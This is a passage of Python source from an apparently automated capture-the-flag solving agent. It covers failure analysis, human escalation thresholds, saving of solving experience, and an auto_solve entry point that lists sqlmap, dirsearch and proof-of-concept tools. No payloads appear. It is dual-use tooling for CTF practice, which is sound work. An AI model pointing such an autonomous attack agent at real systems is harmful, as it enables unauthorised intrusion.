        fail_types = self._analyze_failures()
        self._auto_adjust_strategy(fail_types)

        payload_errors = fail_types.get("payload_error", 0)
        execution_errors = fail_types.get("execution_error", 0)
        same_error = fail_types.get("same_error", 0)
        timeouts = fail_types.get("timeout", 0)

        if readiness.get("reason") == "not_enough_failures_after_coverage" and same_error >= 3:
            self.last_help_reason = "rag_not_attempted"
            self.log("[FAIL_ANALYSIS] Same error repeated, trigger pre-help RAG", "INFO")
            return True

        if payload_errors >= 2 and consecutive_failures < self.max_failures:
            self.log("[FAIL_ANALYSIS] Payload errors detected, retrying with adjustments...", "FAIL")
            return False

        if execution_errors >= 2 and consecutive_failures < self.max_failures:
            self.log("[FAIL_ANALYSIS] Execution errors detected, adjusting parameters...", "FAIL")
            return False

        if same_error >= 3:
            if self.target_type == "auth":
                auth_progress_markers = 0
                for step in self.memory.steps:
                    text = str(getattr(step, "result", "") or "").lower()
                    findings = list(getattr(step, "key_findings", []) or [])
                    if any(marker in text for marker in ["found login form endpoint", "form method:", "form field:"]):
                        auth_progress_markers += 1
                    elif any("login form endpoint" in str(item).lower() or "form method" in str(item).lower() for item in findings):
                        auth_progress_markers += 1
                if auth_progress_markers > 0:
                    self.log("[FAIL_ANALYSIS] Auth branch has structured progress, delay same-error escalation", "INFO")
                    return False
            self.log("[FAIL_ANALYSIS] Repeated same error, escalate to human", "FAIL")
            self.last_help_reason = "same_error"
            return True

        if timeouts >= 3:
            self.log("[FAIL_ANALYSIS] Multiple timeouts encountered", "FAIL")
            self.last_help_reason = "timeouts"
            return True

        if total_steps < self.min_steps_before_help and consecutive_failures < self.max_failures:
            return False

        if consecutive_failures >= self.max_failures:
            self.log(f"[FAIL_ANALYSIS] Consecutive failures reached {consecutive_failures}", "FAIL")
            self.last_help_reason = "consecutive_failures"
            return True

        for action_id, count in recent_failure_stats["action_id_counts"].items():
            if count >= self.max_failures:
                self.log(f"[FAIL_ANALYSIS] Action {action_id} failed {count} times", "FAIL")
                self.last_help_reason = f"action_failures:{action_id}"
                return True

        for action_type, count in recent_failure_stats["action_type_counts"].items():
            if count >= self.max_failures:
                self.log(f"[FAIL_ANALYSIS] Action type {action_type} failed {count} times", "FAIL")
                self.last_help_reason = f"action_type_failures:{action_type}"
                return True

        critical_tools = {"python_poc", "sqlmap", "dirsearch", "source_analysis"}
        for tool, count in recent_failure_stats["canonical_tool_counts"].items():
            if tool in critical_tools and count >= self.max_failures:
                self.log(f"[FAIL_ANALYSIS] Tool {tool} failed {count} times recently", "FAIL")
                self.last_help_reason = f"tool_failures:{tool}"
                return True

        if total_steps >= self.max_steps:
            self.log(f"[FAIL_ANALYSIS] Max steps ({self.max_steps}) reached", "FAIL")
            self.consecutive_help_triggers += 1
            self.last_help_reason = "max_steps"
            return True

        if self.consecutive_help_triggers >= 1 and self.last_help_reason == "max_steps":
            if total_steps < self.max_steps + 2:
                self.log("[FAIL_ANALYSIS] Recently hit max_steps, retrying before escalating", "INFO")
                return False

        self.last_help_reason = None
        return False

    def _auto_save_experience(self, flag: str):
        """自动保存解题经验（无需确认）"""
        try:
            steps = [
                {
                    "tool": step.tool,
                    "target": step.target,
                    "result": step.result,
                    "success": step.success,
                }
                for step in self.memory.steps
            ]

            techniques = list({
                step.tool for step in self.memory.steps if step.success
            })

            exp_file = auto_save_experience(
                problem_type=self.target_type,
                target=self.target_url,
                steps=steps,
                flag=flag,
                key_techniques=techniques,
            )

            self.log(f"解题经验已自动保存: {exp_file}", "MEMORY")

        except Exception as e:
            self.log(f"保存经验失败: {e}", "ERROR")


def auto_solve(
    url: str = "",
    hint: str = "",
    description: str = "",
    source_code: str = ""
) -> Dict[str, Any]:
    """
    一键自动解题。

    默认转发到项目级 orchestrator 统一主链入口，避免绕过初始化与状态编排。
    """
    from orchestrator import orchestrate_challenge

    return orchestrate_challenge(
        url=url,
        hint=hint,
        description=description,
        source_code=source_code,
    )


# 测试
if __name__ == "__main__":
    # 使用说明
    print("""
CTF Agent v2.1 - 自动化解题模块
==============================

使用方式:
    from orchestrator import orchestrate_challenge

    result = orchestrate_challenge(
        url="https://target.com",
        hint="有手机就行",
        description="题目描述"
    )

    print(result.get("flag", ""))

或者:
    python main.py --url "https://target.com" --hint "有手机就行" --description "题目描述"
    """)
